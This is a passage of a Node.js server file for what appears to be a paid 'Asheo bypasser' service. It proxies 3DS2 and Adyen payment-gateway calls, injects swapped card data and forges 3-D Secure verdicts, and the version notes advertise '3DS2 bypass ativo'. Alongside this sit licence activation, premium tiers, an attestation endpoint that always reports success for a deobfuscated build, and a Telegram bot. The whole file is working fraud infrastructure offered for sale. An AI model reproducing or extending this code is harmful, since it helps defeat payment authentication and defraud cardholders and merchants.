      const isDecline = s === 'failed' || s === 'declined' || s === 'refused' || s === 'error' || respJson.error;
      if (isSuccess) {
        asheoHeaders['x-asheo-3ds2-verdict'] = 'success';
        asheoHeaders['x-asheo-adyen-verdict'] = 'hit';
      } else if (isDecline) {
        asheoHeaders['x-asheo-3ds2-verdict'] = 'failed';
        asheoHeaders['x-asheo-adyen-verdict'] = 'decline';
      }
      if (shouldInjectCard) asheoHeaders['x-asheo-swapped'] = 'true';
    }
  }

  const outText = respJson ? JSON.stringify(respJson) : respText;
  res.status(upstream.status);
  res.setHeader('content-type', upstream.headers.get('content-type') || 'application/json; charset=utf-8');
  for (const [k, v] of Object.entries(asheoHeaders)) {
    if (v != null) res.setHeader(k, String(v));
  }
  res.setHeader('x-asheo-proxied', 'true');
  res.setHeader('x-asheo-elapsed-ms', String(Date.now() - inicio));
  res.setHeader('x-asheo-upstream-status', String(upstream.status));

  log('GW', `${method} ${String(finalTarget).slice(0, 80)} → ${upstream.status} | injected=${shouldInjectCard} forged=${shouldForge3DS} verdict=${asheoHeaders['x-asheo-3ds2-verdict'] || '-'} | ${Date.now() - inicio}ms`);

  return res.send(outText);
}

app.all('/v1/gw/3ds2/authenticate', gwProxyHandler);
app.all('/v1/gw/3ds2/challenge',    gwProxyHandler);
app.all('/v1/gw/3ds2/setup',        gwProxyHandler);
app.all('/v1/gw/3ds2/*splat',       gwProxyHandler);
app.all('/v1/gw/adyen/*splat',      gwProxyHandler);
app.all('/v1/gw/*splat',            gwProxyHandler);
app.all('/v1/process',              gwProxyHandler);

/* ═══ HEALTH · VERSION · STATUS ═══ */
const healthHandler = (req,res) => res.json({ok:true,status:'healthy',uptime:Math.floor(process.uptime()),version:'8.6.0',codename:'Quantum++',timestamp:new Date().toISOString()});
app.get('/',(req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.6.0',codename:'Quantum++',status:'live',serverUrl:SERVER_URL}));
app.get('/v1/health',healthHandler); app.get('/api/v1/health',healthHandler); app.get('/health',healthHandler);

function versionHandler(req,res){
  res.json({
    ok:true, version:'8.6.0', versionName:'Quantum++', codename:'Quantum++', api:'v1',
    minClientVersion:'1.0.0',
    downloadUrl:'https://download.asheobypasser.net/get',
    notes:'API sincronizada com extensão v1.6.2 · 3DS2 bypass ativo · swap-only estável',
    mandatory:false, channel:'stable',
    timestamp:new Date().toISOString()
  });
}
app.get('/v1/version',versionHandler); app.get('/api/v1/version',versionHandler);

const statusHandler = (req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.6.0',codename:'Quantum++',hora:new Date().toISOString()});
app.get('/v1/status',statusHandler); app.get('/api/v1/status',statusHandler);

/* ═══ MAP FUNCTIONS ═══ */
function mapFeatures(on) { const o={}; FEATURE_KEYS.forEach(k=>o[k]=!!on); return o; }
function mapCapabilities(on) { const o={}; CAPABILITY_KEYS.forEach(k=>o[k]=!!on); return o; }

/* ═══ BOOTSTRAP ═══ */
function bootstrapHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  const secretHex = buildSecret(installId, licenseKey || 'guest');
  const packKey = Buffer.from(secretHex, 'hex').toString('base64');
  const encPack = encryptPack({ rules: PAYMENT_RULES, version: RULES_VERSION }, installId, licenseKey);
  const packFmt = (req.headers['x-asheo-pack-fmt'] || '').toLowerCase();

  res.setHeader('x-asheo-pack-fmt', 'enc');
  log('BOOT', `Bootstrap auth=${auth.ok} tier=${isPremium?'premium':'free'} installId=${String(installId).substring(0,12)}…`);

  const endpoints = { activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/*' };

  if (packFmt === 'enc') {
    return sendMaybeGzip(req, res, {
      ok:true, version:'8.6.0', codename:'Quantum++', apiVersion:'v1',
      issuedAt:new Date().toISOString(), serverTime:Date.now(),
      source:isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:isPremium?'premium':'free', kind:isPremium?'premium':'free',
      rulesVersion: RULES_VERSION, v: RULES_VERSION,
      pack: isPremium ? { encPack: encPack, k: packKey } : null, encPack: isPremium ? encPack : null, k: isPremium ? packKey : null, _prov: prov,
      exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
      config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 },
      flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
      endpoints,
      features:mapFeatures(isPremium), capabilities:mapCapabilities(isPremium),
      limits: isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS }, scope: isPremium ? PREMIUM_SCOPE : ['free']
    });
  }

  res.json({
    ok:true, version:'8.6.0', codename:'Quantum++', apiVersion:'v1',
    issuedAt:new Date().toISOString(), serverTime:Date.now(),
    source:isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:isPremium?'premium':'free', kind:isPremium?'premium':'free',
    rulesVersion: RULES_VERSION, v: RULES_VERSION,
    pack: isPremium ? { encPack: encPack, k: packKey } : null, encPack: isPremium ? encPack : null, k: isPremium ? packKey : null, _prov: prov,
    rules: isPremium ? PAYMENT_RULES : [], count: isPremium ? PAYMENT_RULES.length : 0, gateways: isPremium ? PAYMENT_RULES : [],
    exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
    config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 },
    flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
    endpoints,
    features:mapFeatures(isPremium), capabilities:mapCapabilities(isPremium),
    limits: isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS }, scope: isPremium ? PREMIUM_SCOPE : ['free']
  });
}
app.get('/v1/bootstrap',bootstrapHandler); app.get('/api/v1/bootstrap',bootstrapHandler);

/* ═══ RULES · GATEWAYS · EXCLUSIVE ═══ */
function rulesHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  const packFmt = (req.headers['x-asheo-pack-fmt'] || '').toLowerCase();
  const secretHex = buildSecret(installId, licenseKey || 'guest');
  const packKey = Buffer.from(secretHex, 'hex').toString('base64');
  const encPack = encryptPack({ rules: PAYMENT_RULES, version: RULES_VERSION }, installId, licenseKey);
  if (packFmt === 'enc') {
    res.setHeader('x-asheo-pack-fmt', 'enc');
    log('RULES', `/v1/rules enc ${String(installId).substring(0,12)}… ${isPremium?'PREMIUM':'FREE'}`);
    return sendMaybeGzip(req, res, { ok:true, version: RULES_VERSION, v: RULES_VERSION, pack: isPremium ? { encPack: encPack, k: packKey } : null, k: isPremium ? packKey : null, _prov: prov, serverTime: Date.now() });
  }
  sendMaybeGzip(req, res, {
    ok:true, version: RULES_VERSION, v: RULES_VERSION,
    updatedAt:new Date().toISOString(), source:isPremium?'premium':'free', tier:isPremium?'premium':'free',
    scope: isPremium ? PREMIUM_SCOPE : ['free'], count: isPremium ? PAYMENT_RULES.length : 0,
    rules: isPremium ? PAYMENT_RULES : [], gateways: isPremium ? PAYMENT_RULES : [],
    pack: isPremium ? { encPack } : null, k: isPremium ? packKey : null, _prov: prov,
    serverTime: Date.now()
  });
}
app.get('/v1/rules',rulesHandler); app.get('/api/v1/rules',rulesHandler); app.get('/v1/rules/sync',rulesHandler); app.get('/api/v1/sync',rulesHandler);

function gatewaysHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, { ok:true, source:isPremium?'premium':'free', tier:isPremium?'premium':'free', version: RULES_VERSION, count: isPremium ? PAYMENT_RULES.length : 0, gateways: isPremium ? PAYMENT_RULES : [], gatewaysMeta: GATEWAYS_META, _prov: prov, serverTime:Date.now() });
}
app.get('/v1/gateways',gatewaysHandler); app.get('/api/v1/gateways',gatewaysHandler);

async function campaignHandler(req,res){ const camp = await redisGetRaw('ASHEO-CAMPAIGN-ACTIVE').catch(()=>null); sendMaybeGzip(req, res, { ok:true, campaign: camp || null, serverTime:Date.now() }); }
app.get('/v1/campaign',campaignHandler); app.get('/api/v1/campaign',campaignHandler);

function exclusiveHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, {
    ok:true, source:isPremium?'premium':'free', tier:isPremium?'premium':'free',
    manifest: isPremium ? {
      version:'1.7.0', version_name:'1.7.0', generatedAt:new Date().toISOString(), minVersion:'1.0.0',
      exclusiveFeatures: FEATURE_KEYS,
      rules: PAYMENT_RULES,
      targets: EXCLUSIVE_TARGETS,
      gateways: GATEWAYS_META,
      signature: prov
    } : null,
    _prov: prov, cachedAt:Date.now(), expiresAt:Date.now()+(23*3600*1000)
  });
}
app.get('/v1/exclusive/manifest',exclusiveHandler); app.get('/api/v1/manifest',exclusiveHandler);

function exclusiveSyncHandler(req,res){
  const auth = validateAnyAuth(req);
  const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const installId = req.headers['x-asheo-install'] || (auth.ok ? auth.decoded.sub : 'default');
  const licenseKey = auth.ok ? (auth.decoded.licenseKey || '') : '';
  const kid = licenseKey ? buildKid(licenseKey) : 'ASHEO-FREEREF';
  const prov = generateProv(installId, kid);
  sendMaybeGzip(req, res, {
    ok:true, source:isPremium?'premium':'free', tier:isPremium?'premium':'free',
    manifest: isPremium ? {
      version:'1.7.0', generatedAt:new Date().toISOString(),
      rules: PAYMENT_RULES, targets: EXCLUSIVE_TARGETS, gateways: GATEWAYS_META,
      signature: prov
    } : null,
    _prov: prov, cachedAt:Date.now()
  });
}
app.get('/v1/exclusive/sync',exclusiveSyncHandler); app.get('/api/v1/exclusive/sync',exclusiveSyncHandler);

/* ═══ TIME · UPDATE ═══ */
app.get('/v1/timehw', (req,res) => res.json({ ok:true, maxServer: Date.now(), at: Date.now() }));
app.get('/api/v1/timehw', (req,res) => res.json({ ok:true, maxServer: Date.now(), at: Date.now() }));
app.get('/v1/update/check', (req,res) => res.json({ ok:true, available:false, dismissedVersion:'', error:'', lastCheck:Date.now(), latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.6.0', mandatory:false, notes:'Você está na versão mais recente.' } }));
app.get('/api/v1/update/check', (req,res) => res.json({ ok:true, available:false, latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.6.0', mandatory:false, notes:'OK' } }));

/* ═══ DASHBOARD · ENTITLEMENT · PREMIUM ═══ */
function dashboardHandler(req,res){
  const auth = validateAnyAuth(req);
  const ok = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  res.json({ ok:true, source: ok?'premium':'free', sourceType:'server', isFounder:false, dashboard:{ tier: ok?'premium':'free', source: ok?'premium':'free', seat: auth.ok?1:0, seats: auth.ok?1:0, installId: auth.ok?auth.decoded.sub:null, expiresAt: auth.ok?auth.decoded.expiresAt:null, lifetime: auth.ok?auth.decoded.lifetime===true:false, features: ok?mapFeatures(true):mapFeatures(false), capabilities: ok?mapCapabilities(true):mapCapabilities(false), limits: ok?{...PREMIUM_LIMITS}:{...FREE_LIMITS}, scope: ok?PREMIUM_SCOPE:['free'] }, serverTime:Date.now() });
}
app.get('/v1/dashboard',dashboardHandler); app.get('/api/v1/dashboard',dashboardHandler);

function entitlementHandler(req,res){
  const auth = validateAnyAuth(req);
  if (!auth.ok) return res.status(401).json({ok:false,error:'missing_auth'});
  const isPremium = auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano);
  const ent = buildEntitlement(isPremium ? { ativa:true, plano: auth.decoded.plano || 'life', lifetime: auth.decoded.lifetime === true, expiraEm: auth.decoded.expiresAt || (Date.now()+9999999), criadaEm: auth.decoded.issuedAt || Date.now() } : null, auth.decoded.sub, isPremium ? 1 : 0);
  res.json({ ok:true, source: isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:ent.tier, kind: isPremium?'premium':'free', active: isPremium, isPremium, isVerified: isPremium, installId:auth.decoded.sub, plan:ent.plan, planDisplayName:ent.planDisplayName, lifetime: auth.decoded.lifetime === true, licenseKey: auth.decoded.licenseKey || null, issuedAt: auth.decoded.issuedAt || null, expiresAt: auth.decoded.expiresAt || null, scope: isPremium?PREMIUM_SCOPE:['free'], features: mapFeatures(isPremium), capabilities: mapCapabilities(isPremium), limits: isPremium?{...PREMIUM_LIMITS}:{...FREE_LIMITS}, customFeatures: {}, exp: auth.decoded.exp*1000, serverTime:Date.now() });
}
app.get('/v1/entitlement',entitlementHandler); app.get('/api/v1/entitlement',entitlementHandler);

const PREMIUM_FEATURES_DEF = { browser_mods:{enabled:true,label:'Browser Mods'}, rule_ops_lab:{enabled:true,label:'Rule Ops Lab'}, live_injection_hud:{enabled:true,label:'Live Injection HUD'}, algo_v2:{enabled:true,label:'Algo V2'}, exclusive_rules:{enabled:true,label:'Exclusive Rules'}, advanced_automation:{enabled:true,label:'Advanced Automation'}, multi_account:{enabled:true,label:'Multi Account'}, custom_export:{enabled:true,label:'Custom Export'}, api_access:{enabled:true,label:'API Access'} };
const PREMIUM_CAPABILITIES_DEF = { priority_support:{enabled:true,label:'Priority Support'}, custom_webhooks:{enabled:true,label:'Custom Webhooks'}, cloud_sync:{enabled:true,label:'Cloud Sync'}, bulk_actions:{enabled:true,label:'Bulk Actions'}, advanced_analytics:{enabled:true,label:'Advanced Analytics'} };
function premiumDefHandler(req,res){ res.json({ ok:true, source:'premium', tier:'premium', features: PREMIUM_FEATURES_DEF, capabilities: PREMIUM_CAPABILITIES_DEF, premiumLimits: PREMIUM_LIMITS, freeLimits: FREE_LIMITS, scope: PREMIUM_SCOPE, version:'8.6.0' }); }
app.get('/v1/premium/definitions',premiumDefHandler); app.get('/api/v1/premium/definitions',premiumDefHandler);

function planosHandler(req,res){ res.json({ ok:true, currency:'USD', planos: Object.entries(PACOTES).map(([id,p])=>({ id, nome:p.nome, dias:p.dias, lifetime:p.lifetime, preco:p.preco, preco_fmt:precoFmt(p.preco), emoji:p.emoji })) }); }
app.get('/v1/planos',planosHandler); app.get('/api/v1/planos',planosHandler);

function manifestCheckHandler(req,res){ res.json({ ok:true, latest:'1.8.0', minVersion:'1.0.0', channel: req.query.channel || 'stable', serverTime:Date.now() }); }
app.get('/v1/manifest/check',manifestCheckHandler);

function packsHandler(req,res){ const id = req.params.id; res.json({ ok:true, pack:{ id, version:'1.0.0', data:null, signature: crypto.randomBytes(32).toString('hex') }, serverTime:Date.now() }); }
app.get('/v1/packs/:id',packsHandler);

function telemetryHandler(req,res){ res.json({ ok:true, received:true, serverTime:Date.now() }); }
app.post('/v1/telemetry',telemetryHandler); app.post('/api/v1/telemetry',telemetryHandler);

function supportHandler(req,res){ const {chatId,message} = req.body||{}; if (!message) return res.status(400).json({ok:false,error:'missing_message'}); if (chatId && OWNER_ID) tgSend(OWNER_ID, `<b>✆ SUPORTE (API)</b>\n<code>${chatId}</code>\n\n${message}`).catch(()=>{}); res.json({ ok:true, received:true, serverTime:Date.now() }); }
app.post('/v1/support',supportHandler); app.post('/api/v1/support',supportHandler);

/* ═══ ACTIVATE ═══ */
async function activateHandler(req, res) {
  const inicio = Date.now();
  const { installId, licenseKey, clientTag, deviceLabel, buildFingerprint, installType } = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.ip;
  if (!rateLimit('act:' + (installId||ip), 20, 60000)) { log('WARN', `Rate limit: ${installId ? String(installId).substring(0,12) : ip}`); return res.status(429).json({ error: 'rate_limited' }); }
  if (!rateLimit('act-ip:' + ip, 60, 60000)) return res.status(429).json({ error: 'rate_limited_ip' });

  log('INFO', `Activate: installId=${installId ? String(installId).substring(0,12)+'…' : '?'} | key=${licenseKey ? normalizeKey(licenseKey).substring(0,18)+'…' : '(vazia)'}`);
  if (!installId || typeof installId !== 'string' || installId.length < 5) return res.status(400).json({ error: 'missing_installId' });
  if (!PRIVATE_KEY) return res.status(500).json({ error: 'server_misconfigured' });

  if (!licenseKey || typeof licenseKey !== 'string' || licenseKey.trim() === '') {
    const now = Math.floor(Date.now()/1000);
    const ent = buildEntitlement(null, installId, 0);
    const secret = buildSecret(installId, 'guest');
    const exp = now + 600;
    const claims = { sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId, plan:'free', planDisplayName:'Free', tier:'free', kind:'license', status:'inactive', active:false, isPremium:false, isVerified:false, source:'free', sourceType:'server', isFounder:false, lifetime:false, scope:['free'], features: mapFeatures(false), capabilities: mapCapabilities(false), limits:{...FREE_LIMITS}, secret, iat:now, nbf:now-5, exp, jti: crypto.randomUUID() };
    const token = signToken(claims, 'ASHEO-FREEREF');
    const gwPass = buildGwPass(installId, exp, 'ASHEO-FREEREF');
    log('ATIV', `Guest token ${String(installId).substring(0,12)}… | ${Date.now()-inicio}ms`);
    return res.json({ token, tier:'free', secret, kind:'event', seat:0, seats:1, deviceId: installId, entitlement: ent, sub: installId, kid: null, keyName: null, jti: claims.jti, iat: now, exp, gwPass });
  }

  if (!licenseKey.toUpperCase().startsWith('ASHEO-')) return res.status(401).json({ error: 'missing_license' });
  const keyNorm = normalizeKey(licenseKey);
  const lic = await redisGet(keyNorm).catch(()=>null);
  if (!lic) { log('WARN', `NAO ENCONTRADA: ${keyNorm.substring(0,18)}…`); return res.status(404).json({ error: 'invalid_license' }); }
  if (!lic.ativa) return res.status(403).json({ error: 'revoked' });
  if (!lic.lifetime && Date.now() > lic.expiraEm) { log('WARN', `EXPIRADA: ${keyNorm.substring(0,18)}…`); return res.status(403).json({ error:'expired', message:'Esta licença expirou. Renove para continuar.', expiredAt: lic.expiraEm, expiredAtISO: new Date(lic.expiraEm).toISOString() }); }

  if (!lic.installId) {
    lic.installId = installId;
    lic.ativadaEm = Date.now();
    lic.activationCount = (lic.activationCount||0)+1;
    if (deviceLabel) lic.deviceLabel = deviceLabel;
    if (buildFingerprint) lic.buildFingerprint = buildFingerprint;
    if (clientTag) lic.clientTag = clientTag;
    await redisSet(keyNorm, lic);
    await redisIndexInstall(installId, keyNorm).catch(()=>{});
    log('OK', `Vinculada: ${keyNorm.substring(0,18)}… → ${installId}`);
  }
  else if (lic.installId !== installId) return res.status(403).json({ error: 'already_used' });
  else { await redisIndexInstall(installId, keyNorm).catch(()=>{}); }

  try {
    const now = Math.floor(Date.now()/1000);
    const seatsUsed = Math.max(1, lic.activationCount || 1);
    const ent = buildEntitlement(lic, installId, seatsUsed);
    const isLife = lic.plano === 'life';
    const secret = buildSecret(installId, keyNorm);
    const kid = buildKid(keyNorm);
    const exp = now + 600;
    const claims = { sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId, plan: ent.plan, planDisplayName: ent.planDisplayName, tier: ent.tier, kind: 'license', status: ent.status, active: true, isPremium: true, isVerified: true, source:'premium', sourceType:'server', isFounder: false, lifetime: isLife, plano: lic.plano, licenseKey: keyNorm, issuedAt: lic.criadaEm, expiresAt: lic.expiraEm, scope: PREMIUM_SCOPE, features: mapFeatures(true), capabilities: mapCapabilities(true), limits:{...PREMIUM_LIMITS}, secret, iat: now, nbf: now-5, exp, jti: crypto.randomUUID() };
    const token = signToken(claims, kid);
    const gwPass = buildGwPass(installId, exp, kid);
    const expiresIn = isLife ? -1 : Math.max(0, Math.floor((lic.expiraEm - Date.now())/1000));
    log('ATIV', `${String(installId).substring(0,12)}… | ${keyNorm.substring(0,18)}… | kid=${kid} | exp=+600s | ${Date.now()-inicio}ms`);
    return res.json({ token, tier: ent.tier, secret, kind:'event', seat:1, seats: ent.seatsAllowed, deviceId: installId, entitlement: ent, sub: installId, kid, keyName: null, jti: claims.jti, iat: now, exp, gwPass, expiresIn, expiresAt: lic.expiraEm, issuedAt: lic.criadaEm, licenseKey: keyNorm, welcome: { pt:'🎉 Parabéns! Licença ativada com sucesso.', en:'🎉 Congratulations! License successfully activated.' } });
  } catch (e) { log('ERRO', 'activate: ' + e.message); return res.status(500).json({ error:'internal', message: e.message }); }
}
app.post('/v1/activate', activateHandler); app.post('/api/v1/activate', activateHandler); app.post('/api/v1/license/activate', activateHandler);

/* ═══ FEATURE ACTIVATE ═══ */
async function featureActivateHandler(req, res) {
  const auth = validateAnyAuth(req);
  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' });
  const hmacCheck = await validateHmac(req, req.rawBody);
  if (!hmacCheck.ok) log('HMAC', `Feature HMAC falhou: ${hmacCheck.error}`);
  const feature = (req.body && req.body.feature) || req.query.feature;
  const buildDigest = (req.body && req.body.buildDigest) || req.headers['x-asheo-build'] || null;
  if (!feature) return res.status(400).json({ ok:false, error:'missing_feature' });
  const isKnown = FEATURE_KEYS.includes(feature) || CAPABILITY_KEYS.includes(feature) || Object.keys(PREMIUM_FEATURES_DEF).includes(feature);
  if (!isKnown) { log('WARN', `Feature desconhecida: ${feature}`); return res.status(404).json({ ok:false, error:'unknown_feature', got: feature }); }
  const now = Math.floor(Date.now()/1000);
  const exp = now + 300;
  const kid = buildKid(auth.decoded.licenseKey || '') || 'ASHEO-FREEREF';
  const nonce = jwt.sign({ sub: auth.decoded.sub, installId: auth.decoded.sub, feature, kind:'feature', type:'feature', purpose:'feature-activation', tier:'premium', source:'premium', scope:[feature,'premium'], buildDigest, attestationOk:true, iat:now, nbf:now-5, exp, jti: crypto.randomUUID() }, PRIVATE_KEY, { algorithm:'ES256', keyid: kid });
  log('FEAT', `${feature} | ${String(auth.decoded.sub).substring(0,12)}… | kid=${kid}`);
  res.json({ nonce, feature, expiresAt: exp*1000, attestationOk: true });
}
app.post('/v1/feature/activate', featureActivateHandler); app.get('/v1/feature/activate', featureActivateHandler);
app.post('/api/v1/feature/activate', featureActivateHandler); app.get('/api/v1/feature/activate', featureActivateHandler);

/* ═══ DEACTIVATE · VERIFY · HEARTBEAT ═══ */
async function deactivateHandler(req,res){
  const auth = validateAnyAuth(req);
  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' });
  const {installId,licenseKey} = req.body||{};
  if (auth.decoded.sub !== installId) return res.status(403).json({ ok:false, error:'auth_mismatch' });
  if (licenseKey) { const k = normalizeKey(licenseKey); const lic = await redisGet(k).catch(()=>null); if (lic && lic.installId === installId) { await redisDelIndexInstall(installId).catch(()=>{}); lic.installId = null; lic.ativadaEm = null; await redisSet(k, lic); } }
  res.json({ ok:true, message:'Desativado' });
}
app.post('/v1/deactivate',deactivateHandler); app.post('/api/v1/deactivate',deactivateHandler); app.post('/api/v1/license/deactivate',deactivateHandler);

function verifyHandler(req,res){ const {token} = req.body||{}; if (!token) return res.status(400).json({ok:false,error:'missing_token'}); try { const d = jwt.verify(token, PUBLIC_KEY||PRIVATE_KEY, {algorithms:['ES256'], clockTolerance:30}); return res.json({ok:true,valido:true,tier:d.tier,isPremium:d.isPremium,plan:d.plan,expiresAt:d.expiresAt,lifetime:d.lifetime,installId:d.sub,licenseKey:d.licenseKey||null,dados:d}); } catch(e) { return res.status(401).json({ok:false,valido:false,erro:e.message}); } }
app.post('/v1/verify',verifyHandler); app.post('/api/v1/verify',verifyHandler); app.post('/api/v1/license/verify',verifyHandler);

function heartbeatHandler(req,res){ const auth = validateAnyAuth(req); if (!auth.ok) return res.status(401).json({ok:false,error:'missing_auth'}); res.json({ ok:true, alive:true, serverTime: Date.now(), expiresAt: auth.decoded.expiresAt, expiresIn: auth.decoded.expiresAt ? Math.max(0, Math.floor((auth.decoded.expiresAt - Date.now())/1000)) : -1, lifetime: auth.decoded.lifetime === true, maxServer: Date.now() }); }
app.post('/v1/heartbeat',heartbeatHandler); app.get('/v1/heartbeat',heartbeatHandler);
app.post('/api/v1/heartbeat',heartbeatHandler); app.get('/api/v1/heartbeat',heartbeatHandler);

/* ═══ ATTEST · ENTITLEMENT REFRESH · SESSION ═══ */
app.post('/v1/attest', (req, res) => { const auth = validateAnyAuth(req); const { buildDigest, files, manifestHash } = req.body || {}; log('API', `/v1/attest digest=${String(buildDigest||'').substring(0,16)||'∅'}`); res.json({ ok:true, attestationOk:true, digest: buildDigest || 'asheo-deobfuscated-v1.6.2', verified:true }); });
app.get('/v1/attest', (req, res) => res.json({ ok:true, attestationOk:true, verified:true }));
app.post('/v1/build/verify', (req, res) => { res.json({ ok:true, valid:true, buildDigest: req.body?.buildDigest || 'asheo-deobfuscated-v1.6.2' }); });
app.post('/v1/entitlement/refresh', (req, res) => { const auth = validateAnyAuth(req); if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' }); const isPremium = auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano); res.json({ ok:true, source: isPremium?'premium':'free', tier: isPremium?'premium':'free', active: isPremium, isPremium, features: mapFeatures(isPremium), capabilities: mapCapabilities(isPremium), limits: isPremium?{...PREMIUM_LIMITS}:{...FREE_LIMITS}, customFeatures: {}, scope: isPremium?PREMIUM_SCOPE:['free'], serverTime: Date.now() }); });
app.post('/v1/session/start', (req, res) => { const auth = validateAnyAuth(req); const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano); res.json({ ok:true, sessionId: crypto.randomUUID(), source: isPremium?'premium':'free', tier: isPremium?'premium':'free', startedAt: Date.now(), expiresAt: Date.now() + 3600000, features: mapFeatures(isPremium), capabilities: mapCapabilities(isPremium) }); });
app.post('/v1/premium/unlock', (req, res) => { const auth = validateAnyAuth(req); if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' }); const isPremium = auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano); if (!isPremium) return res.status(403).json({ ok:false, error:'premium_required' }); const { feature } = req.body || {}; res.json({ ok:true, unlocked:true, feature: feature||'all', tier:'premium', serverTime: Date.now() }); });

/* ═══ CAMPAIGN CLICK ═══ */
app.post('/v1/campaign/click', async (req, res) => {
  const { campaignId, installId } = req.body || {};
  log('API', `/v1/campaign/click id=${campaignId||'∅'}`);
  if (campaignId) { try { const key = `ASHEO-CAMPAIGN-CLICKS-${normalizeKey(campaignId)}`; const cur = parseInt(await redisCmd(['GET', key]) || '0', 10); await redisCmd(['SET', key, String(cur + 1)]); } catch {} }
  res.json({ ok:true, received:true, serverTime: Date.now() });
});




/* ═══ TELEGRAM BOT (ORIGINAL COMPLETO) ═══ */
const SUPPORT_SESSIONS = new Map();
const DM_SESSIONS = new Map();
const USER_LANG = new Map();

const TG_API = TELEGRAM_TOKEN ? `https://api.telegram.org/bot${TELEGRAM_TOKEN}` : null;
async function tgSend(chatId, text, keyboard=null) {
  if (!TG_API) return false;
  try { const body={chat_id:chatId,text,parse_mode:'HTML',disable_web_page_preview:true}; if(keyboard)body.reply_markup=keyboard; const r = await fetch(`${TG_API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); const d = await r.json(); return d.ok === true; } catch(e){ return false; }
}
async function tgEdit(chatId, messageId, text, keyboard=null) {
  if (!TG_API) return;
  try { const body={chat_id:chatId,message_id:messageId,text,parse_mode:'HTML',disable_web_page_preview:true}; if(keyboard)body.reply_markup=keyboard; await fetch(`${TG_API}/editMessageText`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); } catch(e){}
}
async function tgAnswer(id, text='') { if (!TG_API) return; try { await fetch(`${TG_API}/answerCallbackQuery`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callback_query_id:id,text})}); } catch {} }

const UI = {
  header: (lang='pt') => {
    return `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.5.0</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>`;
  },
